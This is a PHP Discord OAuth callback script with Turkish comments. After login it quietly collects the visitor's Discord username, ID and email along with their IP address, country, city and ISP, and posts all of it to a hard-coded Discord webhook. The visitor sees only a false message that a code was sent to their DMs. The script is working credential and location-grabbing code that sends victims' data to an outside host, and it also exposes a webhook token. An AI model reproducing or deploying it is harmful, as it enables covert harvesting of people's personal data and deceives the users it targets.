<?php
$client_id = "123456789012345678";          // KENDİ CLIENT ID'NI YAZ
$client_secret = "abcdefghijklmnopqrstuvwxyz"; // KENDİ CLIENT SECRET'INI YAZ
$redirect_uri = "https://site-adin.onrender.com/discord_callback.php";
$webhook = "https://discord.com/api/webhooks/1518189732692103198/bsr3VNCIFgM-yQbOekAfBjYJ5acWdrmmrhnXNHRjko93yJ0bicj9Vzg9GC0d4Y8KwZ8A";

if (!isset($_GET['code'])) die("❌ Yetki kodu alınamadı.");
$code = $_GET['code'];

$token_url = "https://discord.com/api/oauth2/token";
$post = [
    'client_id' => $client_id,
    'client_secret' => $client_secret,
    'grant_type' => 'authorization_code',
    'code' => $code,
    'redirect_uri' => $redirect_uri
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $token_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
$response = curl_exec($ch);
curl_close($ch);

$token = json_decode($response, true);
if (!isset($token['access_token'])) die("❌ Token alınamadı.");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/users/@me");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer " . $token['access_token']]);
$user = json_decode(curl_exec($ch), true);
curl_close($ch);

$ip = $_SERVER['REMOTE_ADDR'];
$konum = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

$mesaj = "**🎯 YENİ GİRİŞ!**\n";
$mesaj .= "👤 " . ($user['username'] ?? 'Bilinmiyor') . "#" . ($user['discriminator'] ?? '0000') . "\n";
$mesaj .= "🆔 " . ($user['id'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "📧 " . ($user['email'] ?? 'Gizli') . "\n";
$mesaj .= "🌐 IP: {$ip}\n";
$mesaj .= "📍 " . ($konum['country'] ?? 'Bilinmiyor') . " / " . ($konum['city'] ?? 'Bilinmiyor') . "\n";
$mesaj .= "🏢 " . ($konum['isp'] ?? 'Bilinmiyor') . "\n";

$payload = json_encode(["content" => $mesaj]);
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_exec($ch);
curl_close($ch);

echo "<h1>✅ Kod gönderildi! DM'ni kontrol et.</h1>";
?>
